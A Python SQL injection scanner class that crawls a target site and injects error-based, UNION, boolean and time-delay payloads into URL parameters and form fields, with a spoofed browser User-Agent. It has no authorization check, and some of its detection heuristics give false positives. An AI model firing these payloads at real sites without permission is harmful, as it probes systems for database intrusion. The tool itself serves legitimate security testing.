import requests
import re
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from datetime import datetime
import uuid

class SQLiScanner:
    def __init__(self, target_url, deep_scan=False):
        self.target_url = target_url
        self.deep_scan = deep_scan
        self.scan_id = str(uuid.uuid4())[:8]
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
        
        # SQL injection payloads
        self.payloads = [
            # Error-based payloads
            ("'", "Error"),
            ("\"", "Error"),
            ("' OR '1'='1", "Error"),
            ("' OR '1'='1' --", "Error"),
            ("' OR '1'='1' #", "Error"),
            ("1' AND '1'='1", "Error"),
            ("1' AND '1'='2", "Error"),
            ("' UNION SELECT NULL--", "Union"),
            ("' UNION SELECT NULL,NULL--", "Union"),
            ("' UNION SELECT NULL,NULL,NULL--", "Union"),
            
            # Boolean-based payloads
            ("' AND '1'='1", "Boolean"),
            ("' AND '1'='2", "Boolean"),
            ("' OR '1'='1", "Boolean"),
            ("' OR '1'='2", "Boolean"),
            
            # Time-based payloads
            ("' OR SLEEP(5)--", "Time"),
            ("' OR pg_sleep(5)--", "Time"),
            ("' WAITFOR DELAY '00:00:05'--", "Time"),
            ("' AND SLEEP(5)--", "Time"),
        ]
        
        # SQL error patterns
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"ORA-[0-9]{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"valid SQLite",
            r"SQL Server.*Driver",
            r"Driver.*SQL Server",
            r"SQLServer JDBC Driver",
            r"com.microsoft.sqlserver",
            r"Unclosed quotation mark",
        ]
    
    def start_scan(self):
        """Start the scanning process"""
        print(f"[*] Starting scan on: {self.target_url}")
        
        # Parse URL and get parameters
        parsed_url = urlparse(self.target_url)
        if parsed_url.query:
            self.scan_parameters(parsed_url)
        else:
            print("[*] No parameters found in URL")
        
        # If deep scan is enabled, crawl for more links
        if self.deep_scan:
            self.crawl_and_scan()
        
        # Scan forms on the page
        self.scan_forms()
        
        print(f"[*] Scan completed. Found {len(self.vulnerabilities)} vulnerabilities")
        return self.vulnerabilities
    
    def scan_parameters(self, parsed_url):
        """Scan URL parameters for SQL injection"""
        params = parse_qs(parsed_url.query)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        for param_name, param_values in params.items():
            original_value = param_values[0]
            
            for payload, payload_type in self.payloads:
                # Test with payload
                test_params = params.copy()
                test_params[param_name] = [original_value + payload]
                
                try:
                    response = self.session.get(base_url, params=test_params, timeout=10)
                    
                    # Check for vulnerabilities
                    finding = self.analyze_response(response, payload, payload_type)
                    
                    if finding['is_vulnerable']:
                        self.vulnerabilities.append({
                            'parameter': param_name,
                            'payload': original_value + payload,
                            'finding': finding,
                            'location': base_url,
                            'timestamp': datetime.now().isoformat(),
                            'type': payload_type
                        })
                        print(f"[!] Vulnerability found in parameter: {param_name} with payload: {payload}")
                        break  # Stop testing this parameter once vulnerability found
                        
                except requests.RequestException as e:
                    print(f"[-] Error testing {param_name}: {e}")
                    continue
    
    def scan_forms(self):
        """Scan forms on the page for SQL injection"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                form_url = urljoin(self.target_url, action)
                
                # Get all input fields
                inputs = form.find_all(['input', 'textarea'])
                form_data = {}
                
                for input_field in inputs:
                    name = input_field.get('name')
                    if name:
                        form_data[name] = 'test'
                
                # Test each field
                for field_name in form_data.keys():
                    for payload, payload_type in self.payloads:
                        test_data = form_data.copy()
                        test_data[field_name] = payload
                        
                        try:
                            if method == 'post':
                                response = self.session.post(form_url, data=test_data, timeout=10)
                            else:
                                response = self.session.get(form_url, params=test_data, timeout=10)
                            
                            finding = self.analyze_response(response, payload, payload_type)
                            
                            if finding['is_vulnerable']:
                                self.vulnerabilities.append({
                                    'parameter': field_name,
                                    'payload': payload,
                                    'finding': finding,
                                    'location': form_url,
                                    'timestamp': datetime.now().isoformat(),
                                    'type': payload_type
                                })
                                print(f"[!] Vulnerability found in form field: {field_name} with payload: {payload}")
                                break
                                
                        except requests.RequestException:
                            continue
                            
        except requests.RequestException as e:
            print(f"[-] Error scanning forms: {e}")
    
    def crawl_and_scan(self):
        """Crawl the website for more pages to scan"""
        try:
            visited = set()
            to_visit = [self.target_url]
            
            while to_visit and len(visited) < 20:  # Limit to 20 pages
                current_url = to_visit.pop(0)
                if current_url in visited:
                    continue
                    
                visited.add(current_url)
                print(f"[*] Crawling: {current_url}")
                
                try:
                    response = self.session.get(current_url, timeout=10)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(current_url, href)
                        
                        # Only scan same domain
                        if urlparse(full_url).netloc == urlparse(self.target_url).netloc:
                            if full_url not in visited and len(visited) < 20:
                                to_visit.append(full_url)
                    
                    # Scan parameters on this page
                    parsed_url = urlparse(current_url)
                    if parsed_url.query:
                        self.scan_parameters(parsed_url)
                        
                except requests.RequestException:
                    continue
                    
        except Exception as e:
            print(f"[-] Error during crawling: {e}")
    
    def analyze_response(self, response, payload, payload_type):
        """Analyze response for SQL injection indicators"""
        finding = {
            'is_vulnerable': False,
            'type': payload_type,
            'evidence': ''
        }
        
        # Check for error messages
        for pattern in self.error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                finding['is_vulnerable'] = True
                finding['evidence'] = f"Error pattern detected: {pattern}"
                finding['type'] = 'Error-based SQL Injection'
                return finding
        
        # Check for time-based injection
        if payload_type == 'Time' and response.elapsed.total_seconds() >= 4:
            finding['is_vulnerable'] = True
            finding['evidence'] = f"Time delay detected: {response.elapsed.total_seconds()} seconds"
            finding['type'] = 'Time-based Blind SQL Injection'
            return finding
        
        # Check for boolean-based differences
        if "' AND '1'='1" in payload:
            # Store baseline for comparison
            self.baseline_response = response.text
        
        if "' AND '1'='2" in payload and hasattr(self, 'baseline_response'):
            if response.text != self.baseline_response:
                finding['is_vulnerable'] = True
                finding['evidence'] = "Boolean-based difference detected"
                finding['type'] = 'Boolean-based Blind SQL Injection'
        
        # Check for union-based indicators
        if payload_type == 'Union':
            if 'SELECT' in response.text.upper() or 'UNION' in response.text.upper():
                finding['is_vulnerable'] = True
                finding['evidence'] = "Union-based injection possible"
                finding['type'] = 'Union-based SQL Injection'
        
        return finding